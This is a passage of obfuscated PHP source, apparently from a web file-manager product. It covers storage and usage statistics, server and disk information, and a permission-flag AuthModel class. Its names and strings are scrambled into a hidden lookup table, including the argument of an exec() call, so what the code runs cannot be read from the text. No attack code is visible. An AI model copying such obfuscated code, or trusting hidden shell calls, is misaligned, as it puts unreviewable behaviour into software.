$f®¼ĞÍÕ‘Õ =& $_SERVER[ÉóçÄÇ]; $D§å“ŒÒ§‚ = strtotime(date($f®¼ĞÍÕ‘Õ[1613], strtotime($Cù·»¤))); $f·È¼•ê = array($f®¼ĞÍÕ‘Õ[192] => array($f®¼ĞÍÕ‘Õ[952], $D§å“ŒÒ§‚)); goto eáš·¢“œÔ; eáš·¢“œÔ: $e…»øˆ°´” = Model($f®¼ĞÍÕ‘Õ[444])->where($f·È¼•ê)->sum($f®¼ĞÍÕ‘Õ[77]); $f·È¼•ê[$f®¼ĞÍÕ‘Õ[397]] = 0; $BîîŞğø… = Model($f®¼ĞÍÕ‘Õ[776])->where($f·È¼•ê)->sum($f®¼ĞÍÕ‘Õ[77]); goto e‡‘†ÍÜãØ; aŠ°«”µÑ‘: $fĞ†¦£îÂØ = Model($f®¼ĞÍÕ‘Õ[776])->where($f·È¼•ê)->sum($f®¼ĞÍÕ‘Õ[77]); $DãÇñâ…ÀÆ = array($f®¼ĞÍÕ‘Õ[220] => $Cù·»¤, $f®¼ĞÍÕ‘Õ[720] => (int) $BîîŞğø…, $f®¼ĞÍÕ‘Õ[1605] => (int) $e…»øˆ°´”, $f®¼ĞÍÕ‘Õ[1606] => (int) $CÙ½æ‡ŸÊÈ, $f®¼ĞÍÕ‘Õ[1607] => (int) $fĞ†¦£îÂØ); return $this->insert($DãÇñâ…ÀÆ); goto CŠ¿Ïªİ¥; e‡‘†ÍÜãØ: $f·È¼•ê[$f®¼ĞÍÕ‘Õ[398]] = 1; $CÙ½æ‡ŸÊÈ = Model($f®¼ĞÍÕ‘Õ[776])->where($f·È¼•ê)->sum($f®¼ĞÍÕ‘Õ[77]); $f·È¼•ê[$f®¼ĞÍÕ‘Õ[398]] = 2; goto aŠ°«”µÑ‘; CŠ¿Ïªİ¥: } public function trend($E‰•ß¥•äÊ, $A¼•Ÿ°‡¨) { goto Aíù¯ÁŞğ; Aíù¯ÁŞğ: $C»óóÊ¸†Ö =& $_SERVER[ÉóçÄÇ]; if (!$this->init($E‰•ß¥•äÊ)) { return !1; } $cÖµŸ¤©àÆ = $this->trendList($E‰•ß¥•äÊ); goto D‘ğğÏ–Ê; BÚâ…±‚÷: if (empty($cÖµŸ¤©àÆ)) { $cÙŠÚæâö = date($C»óóÊ¸†Ö[1608], strtotime($C»óóÊ¸†Ö[1609])); $EÊÎà§À‰† = array($C»óóÊ¸†Ö[220] => $cÙŠÚæâö); foreach ($Bñ¢ÉåæôÛ[$E‰•ß¥•äÊ] as $fÛÌßòî¸» => $BÛÁˆ‘¨¡é) { $EÊÎà§À‰†[$fÛÌßòî¸»] = 0; } $cÖµŸ¤©àÆ[] = $EÊÎà§À‰†; } $eÕˆí°ÑÌ = array(); foreach ($cÖµŸ¤©àÆ as $BÛÁˆ‘¨¡é) { if ($E‰•ß¥•äÊ == $C»óóÊ¸†Ö[1603] && $BÛÁˆ‘¨¡é[$C»óóÊ¸†Ö[1605]] > $BÛÁˆ‘¨¡é[$C»óóÊ¸†Ö[720]]) { $BÛÁˆ‘¨¡é[$C»óóÊ¸†Ö[1605]] = $BÛÁˆ‘¨¡é[$C»óóÊ¸†Ö[720]]; } foreach ($Bñ¢ÉåæôÛ[$E‰•ß¥•äÊ] as $fÛÌßòî¸» => $dÇÏºÚá­ï) { $CøÚñöÓ×¸ = array($C»óóÊ¸†Ö[220] => $BÛÁˆ‘¨¡é[$C»óóÊ¸†Ö[220]], $C»óóÊ¸†Ö[1414] => $dÇÏºÚá­ï); $CøÚñöÓ×¸[$fçîáäÍÂš[$E‰•ß¥•äÊ]] = isset($BÛÁˆ‘¨¡é[$fÛÌßòî¸»]) ? $BÛÁˆ‘¨¡é[$fÛÌßòî¸»] : 0; $eÕˆí°ÑÌ[] = $CøÚñöÓ×¸; } } goto D¼³Û‹—¹½; D‘ğğÏ–Ê: if ($cÖµŸ¤©àÆ && $A¼•Ÿ°‡¨ != $C»óóÊ¸†Ö[1485]) { $a†öòäÇÛø = $cÖµŸ¤©àÆ[0][$C»óóÊ¸†Ö[220]]; $dµŒô ó»Ñ = $this->validDate($A¼•Ÿ°‡¨, $a†öòäÇÛø); $fšèµª£æÎ = array(); $a¸Ä­æáŸ = array_to_keyvalue($cÖµŸ¤©àÆ, $C»óóÊ¸†Ö[220]); foreach ($dµŒô ó»Ñ as $cÙŠÚæâö) { if (isset($a¸Ä­æáŸ[$cÙŠÚæâö])) { $CøÚñöÓ×¸ = $a¸Ä­æáŸ[$cÙŠÚæâö]; } else { $CøÚñöÓ×¸ = end($cÖµŸ¤©àÆ); $CøÚñöÓ×¸[$C»óóÊ¸†Ö[220]] = $cÙŠÚæâö; if ($E‰•ß¥•äÊ == $C»óóÊ¸†Ö[557]) { $CøÚñöÓ×¸[$C»óóÊ¸†Ö[1601]] = $CøÚñöÓ×¸[$C»óóÊ¸†Ö[1602]] = 0; } } $fšèµª£æÎ[] = $CøÚñöÓ×¸; } $cÖµŸ¤©àÆ = $fšèµª£æÎ; } $Bñ¢ÉåæôÛ = array($C»óóÊ¸†Ö[557] => array($C»óóÊ¸†Ö[722] => LNG($C»óóÊ¸†Ö[1617]), $C»óóÊ¸†Ö[1601] => LNG($C»óóÊ¸†Ö[1618]), $C»óóÊ¸†Ö[1602] => LNG($C»óóÊ¸†Ö[1619])), $C»óóÊ¸†Ö[1603] => array($C»óóÊ¸†Ö[720] => LNG($C»óóÊ¸†Ö[1620]), $C»óóÊ¸†Ö[1605] => LNG($C»óóÊ¸†Ö[1621]), $C»óóÊ¸†Ö[1606] => LNG($C»óóÊ¸†Ö[1622]), $C»óóÊ¸†Ö[1607] => LNG($C»óóÊ¸†Ö[1623]))); $fçîáäÍÂš = array($C»óóÊ¸†Ö[557] => $C»óóÊ¸†Ö[1624], $C»óóÊ¸†Ö[1603] => $C»óóÊ¸†Ö[77]); goto BÚâ…±‚÷; D¼³Û‹—¹½: return $eÕˆí°ÑÌ; goto dò÷ŸêË¸Ä; dò÷ŸêË¸Ä: } public function validDate($E¿‡Ğìè¯, $DÕƒÃµˆ¹“) { goto b‰Ü»Šë³ñ; b‰Ü»Šë³ñ: $AÑ»šÄÛñ³ =& $_SERVER[ÉóçÄÇ]; $F§­íØõçÏ = date($AÑ»šÄÛñ³[1608], strtotime($AÑ»šÄÛñ³[1609])); $dÊŒŒÄù = array($F§­íØõçÏ); goto DÜœË“ÅÕ…; F†¡ëğ—†: return $dÊŒŒÄù; goto c¤¨ÑÔë÷; DÜœË“ÅÕ…: switch ($E¿‡Ğìè¯) { case $AÑ»šÄÛñ³[1492]: $Bšøµ£Ò‹´ = mktime(0, 0, 0, date($AÑ»šÄÛñ³[1625]), date($AÑ»šÄÛñ³[1233]) - date($AÑ»šÄÛñ³[1295]) + 7 - 7, date($AÑ»šÄÛñ³[1626])); $b¤¼®Û“‘İ = 0; do { $DØ”¯¹ñæ… = date($AÑ»šÄÛñ³[1608], $Bšøµ£Ò‹´ - 3600 * 24 * 7 * $b¤¼®Û“‘İ); $dÊŒŒÄù[] = $DØ”¯¹ñæ…; $b¤¼®Û“‘İ++; } while ($DÕƒÃµˆ¹“ < $DØ”¯¹ñæ…); break; case $AÑ»šÄÛñ³[1490]: $b¤¼®Û“‘İ = 1; do { $d…İ”Ûß = date($AÑ»šÄÛñ³[1627], strtotime("\x2d\40{$b¤¼®Û“‘İ}\x20\155\157\x6e\x74\150\163")); $dÊŒŒÄù[] = $d…İ”Ûß; $b¤¼®Û“‘İ++; } while ($DÕƒÃµˆ¹“ < $d…İ”Ûß); break; case $AÑ»šÄÛñ³[1628]: $bˆŒ£È‰Œ = (int) date($AÑ»šÄÛñ³[1626], strtotime($DÕƒÃµˆ¹“)); $E•‹Ù¦™ìŞ = (int) date($AÑ»šÄÛñ³[1626]); if ($bˆŒ£È‰Œ >= $E•‹Ù¦™ìŞ) { break; } for ($bˆŒ£È‰Œ; $bˆŒ£È‰Œ < $E•‹Ù¦™ìŞ; $bˆŒ£È‰Œ++) { $dÊŒŒÄù[] = $bˆŒ£È‰Œ . $AÑ»šÄÛñ³[1629]; } break; default: break; } if ($DÕƒÃµˆ¹“ > end($dÊŒŒÄù)) { array_pop($dÊŒŒÄù); } sort($dÊŒŒÄù); goto F†¡ëğ—†; c¤¨ÑÔë÷: } public function listTable($AËÒ„æ‹Õ) { $dŒÎİ°Ö„² = ucfirst($AËÒ„æ‹Õ); return Model($dŒÎİ°Ö„²)->listData(); } public function option($Fî—Ò«†˜ù) { $A²Ô‡Ù÷î = $_SERVER[ÉóçÄÇ][1630] . ucfirst($Fî—Ò«†˜ù); return $this->{$A²Ô‡Ù÷î}(); } private function optionUser() { goto Aìç›Øí¶•; d¶ŠèÇ˜²¦: $DŠÉ¤”íŠÜ = array($fíôíÆÑ…[1632] => array($fíôíÆÑ…[953], $cé‹Äöà•ğ)); $Fî¢“©¥¾Š = Model($fíôíÆÑ…[501])->where($DŠÉ¤”íŠÜ)->count($fíôíÆÑ…[1511]); return array($fíôíÆÑ…[717] => (int) $e÷µöáÖ—æ, $fíôíÆÑ…[1633] => (int) ($e÷µöáÖ—æ - $eÆ‚¸ñùÖ), $fíôíÆÑ…[1634] => (int) $eÆ‚¸ñùÖ, $fíôíÆÑ…[1635] => (int) $Fî¢“©¥¾Š, $fíôíÆÑ…[1636] => $FÛÕ¯»„•Ç); goto aº£‘Šß‰—; Aìç›Øí¶•: $fíôíÆÑ… =& $_SERVER[ÉóçÄÇ]; $e÷µöáÖ—æ = Model($fíôíÆÑ…[501])->count($fíôíÆÑ…[1511]); $eÆ‚¸ñùÖ = Model($fíôíÆÑ…[501])->where($fíôíÆÑ…[1631])->count($fíôíÆÑ…[1511]); goto bÌÓåšö÷¡; bÌÓåšö÷¡: $E«ô½Æ§£Â = intval($GLOBALS[$fíôíÆÑ…[6]][$fíôíÆÑ…[345]][$fíôíÆÑ…[1470]]) / 3600; $cé‹Äöà•ğ = strtotime("\55{$E«ô½Æ§£Â}\40\150\157\165\162\x73"); $DŠÉ¤”íŠÜ = array($fíôíÆÑ…[1632] => array($fíôíÆÑ…[953], $cé‹Äöà•ğ)); goto D»Ø·»Àò; D»Ø·»Àò: $FÛÕ¯»„•Ç = (int) Model($fíôíÆÑ…[501])->where($DŠÉ¤”íŠÜ)->count($fíôíÆÑ…[1511]); if (!$FÛÕ¯»„•Ç) { $FÛÕ¯»„•Ç = 1; } $cé‹Äöà•ğ = strtotime(date($fíôíÆÑ…[1612])); goto d¶ŠèÇ˜²¦; aº£‘Šß‰—: } private function optionFile() { goto Cï«ÊØ•°; a…È»Å©ç—: $f–Ê®„‚¤Ò = $dó§ÁÃë‹Ü[$Cöæ‡–À±Ü[1605]]; $C°àñÛæœÓ = Model($Cöæ‡–À±Ü[776])->where(array($Cöæ‡–À±Ü[397] => 0))->count($Cöæ‡–À±Ü[390]); $fİŒÅõÛé = array($Cöæ‡–À±Ü[397] => 0, $Cöæ‡–À±Ü[192] => array($Cöæ‡–À±Ü[953], strtotime(date($Cöæ‡–À±Ü[1612])))); goto C‚®¾â»’½; C‚®¾â»’½: $fÈ“÷Ñà‚ª = Model($Cöæ‡–À±Ü[776])->where($fİŒÅõÛé)->sum($Cöæ‡–À±Ü[77]); $bÎ·¹§‘Ğ™ = Model($Cöæ‡–À±Ü[776])->where($fİŒÅõÛé)->count($Cöæ‡–À±Ü[390]); return array($Cöæ‡–À±Ü[720] => $B­¬“ù‚¹ô, $Cöæ‡–À±Ü[1605] => $f–Ê®„‚¤Ò, $Cöæ‡–À±Ü[1637] => $B­¬“ù‚¹ô - $f–Ê®„‚¤Ò, $Cöæ‡–À±Ü[1638] => (int) $fÈ“÷Ñà‚ª, $Cöæ‡–À±Ü[722] => (int) $C°àñÛæœÓ, $Cöæ‡–À±Ü[1639] => (int) $bÎ·¹§‘Ğ™); goto a‡ÉÍ¦°·; Cï«ÊØ•°: $Cöæ‡–À±Ü =& $_SERVER[ÉóçÄÇ]; $dó§ÁÃë‹Ü = $this->sourceSize(); $B­¬“ù‚¹ô = $dó§ÁÃë‹Ü[$Cöæ‡–À±Ü[77]]; goto a…È»Å©ç—; a‡ÉÍ¦°·: } private function optionAccess() { $Bå„Í±àÚ÷ =& $_SERVER[ÉóçÄÇ]; return array($Bå„Í±àÚ÷[717] => $this->typeLogCnt(), $Bå„Í±àÚ÷[106] => $this->typeLogCnt($Bå„Í±àÚ÷[106]), $Bå„Í±àÚ÷[424] => $this->typeLogCnt($Bå„Í±àÚ÷[424]), $Bå„Í±àÚ÷[1640] => $this->typeLogCnt($Bå„Í±àÚ÷[1640]), $Bå„Í±àÚ÷[1641] => $this->typeLogCnt($Bå„Í±àÚ÷[1641]), $Bå„Í±àÚ÷[557] => $this->typeLogCnt($Bå„Í±àÚ÷[33], $Bå„Í±àÚ÷[1616])); } private function typeLogCnt($b–¼¥á÷À = '', $c˜¢á¨ÍÇØ = "\151\144") { goto FÎ¡ö¬È†Ô; f¨İ ò»‚«: $fô´íÙïä¥ = array($f½¼•Ú²•¯[192] => array($f½¼•Ú²•¯[953], $BÜ˜Š‘”è‹)); if ($b–¼¥á÷À) { $fô´íÙïä¥[$f½¼•Ú²•¯[29]] = array($f½¼•Ú²•¯[7], $fäœ…èÏŒ[$b–¼¥á÷À]); } $fë½ «ˆÃ = Model($f½¼•Ú²•¯[1615])->where($fô´íÙïä¥)->count($c˜¢á¨ÍÇØ); goto D¥É‰õø; D¥É‰õø: return (int) $fë½ «ˆÃ; goto båç­°¬‘ê; FÎ¡ö¬È†Ô: $f½¼•Ú²•¯ =& $_SERVER[ÉóçÄÇ]; $fäœ…èÏŒ = array($f½¼•Ú²•¯[106] => array($f½¼•Ú²•¯[1642], $f½¼•Ú²•¯[1643]), $f½¼•Ú²•¯[424] => array($f½¼•Ú²•¯[1644], $f½¼•Ú²•¯[1645]), $f½¼•Ú²•¯[1640] => array($f½¼•Ú²•¯[1646], $f½¼•Ú²•¯[1647], $f½¼•Ú²•¯[1648]), $f½¼•Ú²•¯[1641] => array($f½¼•Ú²•¯[1649], $f½¼•Ú²•¯[1650]), $f½¼•Ú²•¯[1651] => array($f½¼•Ú²•¯[1652], $f½¼•Ú²•¯[1653], $f½¼•Ú²•¯[1654])); $BÜ˜Š‘”è‹ = strtotime(date($f½¼•Ú²•¯[1612])); goto f¨İ ò»‚«; båç­°¬‘ê: } private function optionServer() { goto d»ƒ­Îß÷; dõšÇˆóŠ”: $dƒ„‘¨ÆÍĞ = array($b·œ“å‰‹²[769] => $f¥¬À§Ò«Õ[$b·œ“å‰‹²[388]]); $b®ù„‡™Œğ = Model($b·œ“å‰‹²[444])->where($dƒ„‘¨ÆÍĞ)->sum($b·œ“å‰‹²[77]); $dÔİ†ÂÄÓ¡ = explode($b·œ“å‰‹²[50], $_SERVER[$b·œ“å‰‹²[141]]); goto c»ë½­Á±; b¸¬ïÔ¦ôç: if ($d‹«³”á÷§ == $b·œ“å‰‹²[747]) { $C£Æî¤Î = explode($b·œ“å‰‹²[1147], $fìÔ† Œµ…[$b·œ“å‰‹²[913]]); $d‹«³”á÷§ = $C£Æî¤Î[0]; } if ($d‹«³”á÷§ == $b·œ“å‰‹²[750] || $d‹«³”á÷§ == $b·œ“å‰‹²[751]) { $Bî‰òíİŠà = Model()->db()->query($b·œ“å‰‹²[1655]); $D¤ïÅ›‡ÍÑ = $Bî‰òíİŠà[0] && isset($Bî‰òíİŠà[0][$b·œ“å‰‹²[1413]]) ? $Bî‰òíİŠà[0][$b·œ“å‰‹²[1413]] : 0; $d‹«³”á÷§ = $b·œ“å‰‹²[1656] . ($D¤ïÅ›‡ÍÑ ? $b·œ“å‰‹²[8] . $D¤ïÅ›‡ÍÑ : $b·œ“å‰‹²[33]); } $F„”ñ´©ö = $GLOBALS[$b·œ“å‰‹²[6]][$b·œ“å‰‹²[345]][$b·œ“å‰‹²[778]]; goto fÏã„Ã¦£; d»ƒ­Îß÷: $b·œ“å‰‹² =& $_SERVER[ÉóçÄÇ]; $b»†“¥‰ø = $this->diskDriver(); $f¥¬À§Ò«Õ = KodIO::defaultDriver(); goto dõšÇˆóŠ”; c»ë½­Á±: $a¯ˆ‡×¥¼• = $dÔİ†ÂÄÓ¡[0]; $fìÔ† Œµ… = $GLOBALS[$b·œ“å‰‹²[6]][$b·œ“å‰‹²[17]]; $d‹«³”á÷§ = $fìÔ† Œµ…[$b·œ“å‰‹²[914]]; goto b¸¬ïÔ¦ôç; fÏã„Ã¦£: return array($b·œ“å‰‹²[1657] => $b»†“¥‰ø ? $b»†“¥‰ø[$b·œ“å‰‹²[1658]] : 0, $b·œ“å‰‹²[1659] => $b»†“¥‰ø ? $b»†“¥‰ø[$b·œ“å‰‹²[1660]] : 0, $b·œ“å‰‹²[1661] => (int) $f¥¬À§Ò«Õ[$b·œ“å‰‹²[1658]] * 1024 * 1024 * 1024, $b·œ“å‰‹²[1662] => (int) $b®ù„‡™Œğ, $b·œ“å‰‹²[1663] => ucfirst($a¯ˆ‡×¥¼•), $b·œ“å‰‹²[1664] => $b·œ“å‰‹²[1665] . PHP_VERSION, $b·œ“å‰‹²[1666] => phpBuild64() ? 64 : 32, $b·œ“å‰‹²[716] => str_replace($b·œ“å‰‹²[1667], $b·œ“å‰‹²[930], $d‹«³”á÷§), $b·œ“å‰‹²[345] => ucfirst($F„”ñ´©ö), $b·œ“å‰‹²[28] => $_SERVER[$b·œ“å‰‹²[1668]]); goto a ñóè‡ïË; a ñóè‡ïË: } private function diskDriver() { goto f‰¯³ø¾¥; CŒÊÈßµ: $cÃ¹¸é® = $Aî’ø‡Éƒœ - @disk_free_space($F¢ô¸ğâ½Ş); return array($Aîß–ÈˆÑé[1658] => $Aî’ø‡Éƒœ, $Aîß–ÈˆÑé[1660] => $cÃ¹¸é®); goto b”±¨ÌßŞÆ; Aøò«Ù×¡†: if ($BŒ†‚Éîã) { $F¢ô¸ğâ½Ş = $Aîß–ÈˆÑé[1671]; if (function_exists($Aîß–ÈˆÑé[1672])) { exec($Aîß–ÈˆÑé[1673], $bÎƒÏ„ÌÚ); $F¢ô¸ğâ½Ş = $bÎƒÏ„ÌÚ[1] . $Aîß–ÈˆÑé[8]; } } if (!file_exists($F¢ô¸ğâ½Ş)) { return; } $Aî’ø‡Éƒœ = @disk_total_space($F¢ô¸ğâ½Ş); goto CŒÊÈßµ; f‰¯³ø¾¥: $Aîß–ÈˆÑé =& $_SERVER[ÉóçÄÇ]; $F¢ô¸ğâ½Ş = $Aîß–ÈˆÑé[8]; $BŒ†‚Éîã = $GLOBALS[$Aîß–ÈˆÑé[6]][$Aîß–ÈˆÑé[1669]] == $Aîß–ÈˆÑé[1670]; goto Aøò«Ù×¡†; b”±¨ÌßŞÆ: } public function fileChart($cËŸ„½ª˜è) { goto C¹ÈÀ÷œõ; DŠ†İ½õ‹º: $dÏÈ¶çÑ•Å[$c†Ú¼ëë®‹[398]] = 2; $bĞÌĞ˜ÜÌ = Model($c†Ú¼ëë®‹[776])->where($dÏÈ¶çÑ•Å)->sum($c†Ú¼ëë®‹[77]); return array($c†Ú¼ëë®‹[720] => $fİø‰°§ƒ[$c†Ú¼ëë®‹[77]], $c†Ú¼ëë®‹[1605] => $fİø‰°§ƒ[$c†Ú¼ëë®‹[1605]], $c†Ú¼ëë®‹[1606] => (int) $F‘ã²‚°Ë, $c†Ú¼ëë®‹[1607] => (int) $bĞÌĞ˜ÜÌ); goto d®Ùù¾ñÊ; C¹ÈÀ÷œõ: $c†Ú¼ëë®‹ =& $_SERVER[ÉóçÄÇ]; if (isset($cËŸ„½ª˜è[$c†Ú¼ëë®‹[1511]])) { return Model($c†Ú¼ëë®‹[776])->userFileTypeProfile($cËŸ„½ª˜è[$c†Ú¼ëë®‹[1511]]); } if (isset($cËŸ„½ª˜è[$c†Ú¼ëë®‹[1674]])) { return Model($c†Ú¼ëë®‹[776])->groupFileTypeProfile($cËŸ„½ª˜è[$c†Ú¼ëë®‹[1674]]); } goto e‡ÓºÉ; e‡ÓºÉ: $fİø‰°§ƒ = $this->sourceSize(); $dÏÈ¶çÑ•Å = array($c†Ú¼ëë®‹[472] => 0, $c†Ú¼ëë®‹[398] => 1); $F‘ã²‚°Ë = Model($c†Ú¼ëë®‹[776])->where($dÏÈ¶çÑ•Å)->sum($c†Ú¼ëë®‹[77]); goto DŠ†İ½õ‹º; d®Ùù¾ñÊ: } private function sourceSize() { $eÁ‰ äÆ§Ç =& $_SERVER[ÉóçÄÇ]; $F…—É»Ü‡± = Model($eÁ‰ äÆ§Ç[776])->where(array($eÁ‰ äÆ§Ç[397] => 0))->sum($eÁ‰ äÆ§Ç[77]); $dÇíˆƒÉ†æ = Model($eÁ‰ äÆ§Ç[444])->sum($eÁ‰ äÆ§Ç[77]); if ($dÇíˆƒÉ†æ > $F…—É»Ü‡±) { $dÇíˆƒÉ†æ = $F…—É»Ü‡±; } return array($eÁ‰ äÆ§Ç[77] => (int) $F…—É»Ü‡±, $eÁ‰ äÆ§Ç[1605] => (int) $dÇíˆƒÉ†æ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $b³êÒ÷•é =& $_SERVER[ÉóçÄÇ]; $fã‚ö˜œ‹İ = array(array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1675]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1677], $b³êÒ÷•é[1678] => 1, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1681]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1682], $b³êÒ÷•é[1678] => 2, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1683]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1684], $b³êÒ÷•é[1678] => 3, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1685]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1686], $b³êÒ÷•é[1678] => 4, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_VIEW), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1687]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1688], $b³êÒ÷•é[1678] => 5, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1689]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1690], $b³êÒ÷•é[1678] => 6, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b³êÒ÷•é[407] => LNG($b³êÒ÷•é[1691]), $b³êÒ÷•é[1676] => $b³êÒ÷•é[1692], $b³êÒ÷•é[1678] => 7, $b³êÒ÷•é[1679] => 1, $b³êÒ÷•é[1680] => 0)); return $fã‚ö˜œ‹İ; } public static function authCheck($fÁéõ¥Ãîº, $E»‘ÒÌæ¾†) { $fÁéõ¥Ãîº = intval($fÁéõ¥Ãîº); if ($GLOBALS[$_SERVER[ÉóçÄÇ][479]]) { return !0; } if ($fÁéõ¥Ãîº <= 0) { return !1; } if (($fÁéõ¥Ãîº & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fÁéõ¥Ãîº & $E»‘ÒÌæ¾†); } public static function authCheckShow($fÀ—‚…´Òò) { return self::authCheck($fÀ—‚…´Òò, self::AUTH_SHOW); } public static function authCheckView($Fñƒòôñ£Æ) { return self::authCheck($Fñƒòôñ£Æ, self::AUTH_VIEW); } public static function authCheckDownload($b¶™‰ø¢œ) { return self::authCheck($b¶™‰ø¢œ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($A³İãÙã’°) { return self::authCheck($A³İãÙã’°, self::AUTH_UPLOAD); } public static function authCheckEdit($d’Œø”Öàå) { return self::authCheck($d’Œø”Öàå, self::AUTH_EDIT); } public static function authCheckRemove($AôÓİéÕ„) { return self::authCheck($AôÓİéÕ„, self::AUTH_REMOVE); } public static function authCheckShare($C´à÷ÖƒÇ†) { return self::authCheck($C´à÷ÖƒÇ†, self::AUTH_SHARE); } public static function authCheckComment($c¶¹éÈ‰„Ú) { return self::authCheck($c¶¹éÈ‰„Ú, self::AUTH_COMMENT); } public static function authCheckEvent($a ­Ûôº¶‰) { return self::authCheck($a ­Ûôº¶‰, self::AUTH_EVENT); } public static function authCheckRoot($D°ÖŸƒœÖÎ) { return self::authCheck($D°ÖŸƒœÖÎ, self::AUTH_ROOT); } public static function authCheckAction($EÜùÑ‹Œ«, $Eë²ìÀ¡¤Ë) { goto A‘‡µù‰Œ“; a ßÇªãöá: $EùººÇ´·° = $d¿–ÕØŞ¸Æ[$Eë²ìÀ¡¤Ë]; $EÜùÑ‹Œ« = intval($EÜùÑ‹Œ«); if ($EÜùÑ‹Œ« <= 0) { return !1; } goto cœİĞïÂĞ; cœİĞïÂĞ: if (($EÜùÑ‹Œ« & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($EÜùÑ‹Œ« & $EùººÇ´·°); goto dØ™æÈ¡¶; A‘‡µù‰Œ“: $B¦Áƒ±±ƒ· =& $_SERVER[ÉóçÄÇ]; $d¿–ÕØŞ¸Æ = array($B¦Áƒ±±ƒ·[1693] => self::AUTH_VIEW, $B¦Áƒ±±ƒ·[1076] => self::AUTH_DOWNLOAD, $B¦Áƒ±±ƒ·[106] => self::AUTH_UPLOAD, $B¦Áƒ±±ƒ·[1641] => self::AUTH_EDIT, $B¦Áƒ±±ƒ·[1640] => self::AUTH_REMOVE, $B¦Áƒ±±ƒ·[1651] => self::AUTH_SHARE, $B¦Áƒ±±ƒ·[350] => self::AUTH_COMMENT, $B¦Áƒ±±ƒ·[1500] => self::AUTH_EVENT, $B¦Áƒ±±ƒ·[1694] => self::AUTH_ROOT); if (!isset($d¿–ÕØŞ¸Æ[$Eë²ìÀ¡¤Ë])) { return; } goto a ßÇªãöá; dØ™æÈ¡¶: } public static function authDisable($cœÃ±ÍÕâ, $b¶²Î¹õ§¦) { if (intval($cœÃ±ÍÕâ) <= 0) { return 0; } return intval($cœÃ±ÍÕâ) & ~$b¶²Î¹õ§¦; } public $optionType = "\x53\171\163\164\x65\155\x2e\x73\157\165\162\143\145\x41\165\x74\150\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x61\165\x74\150", "\154\141\142\x65\x6c", "\x64\151\x73\x70\154\x61\171", "\163\171\x73\164\x65\155", "\163\x6f\162\x74"); public function initData() { $Då­à·ÎõŸ = $this->authDefault(); foreach ($Då­à·ÎõŸ as $F®‘×Æ«„¢) { $this->add($F®‘×Æ«„¢); } } public function listData($f—ğ³¤º¸ª = false, $c·ßöÒ‘êá = "\163\x6f\x72\x74", $cùÜÇÇÂ¼‹ = false) { return parent::listData($f—ğ³¤º¸ª, $c·ßöÒ‘êá, $cùÜÇÇÂ¼‹); } public function update($c±±±‹î´–, $bĞÑ¦Ëó¤) { $CÜêİÒ–ÙÀ =& $_SERVER[ÉóçÄÇ]; $D«âÂÛÔË› = parent::listData($c±±±‹î´–); $B¡ßÀ¡ÅÎø = $this->findByName($bĞÑ¦Ëó¤[$CÜêİÒ–ÙÀ[28]]); if (!$D«âÂÛÔË› || $B¡ßÀ¡ÅÎø && $B¡ßÀ¡ÅÎø[$CÜêİÒ–ÙÀ[388]] != $D«âÂÛÔË›[$CÜêİÒ–ÙÀ[388]]) { return !1; } $this->filterAuth($bĞÑ¦Ëó¤[$CÜêİÒ–ÙÀ[400]]); return parent::update($c±±±‹î´–, $bĞÑ¦Ëó¤); } public function remove($e¢ÍøÄ’³¯) { $bŒ¹®åƒáˆ = parent::listData($e¢ÍøÄ’³¯); if (!$bŒ¹®åƒáˆ || $bŒ¹®åƒáˆ[$_SERVER[ÉóçÄÇ][1151]]) { return !1; } return parent::remove($e¢ÍøÄ’³¯); } public function add($E‰‚äÉ„È = array()) { goto E´ÌƒçÔ­Á; E´ÌƒçÔ­Á: $fÑÒ§£¼™Ú =& $_SERVER[ÉóçÄÇ]; if ($this->findByName($E‰‚äÉ„È[$fÑÒ§£¼™Ú[28]])) { return !1; } $FñË„Í¸‰ = array($fÑÒ§£¼™Ú[28] => $fÑÒ§£¼™Ú[33], 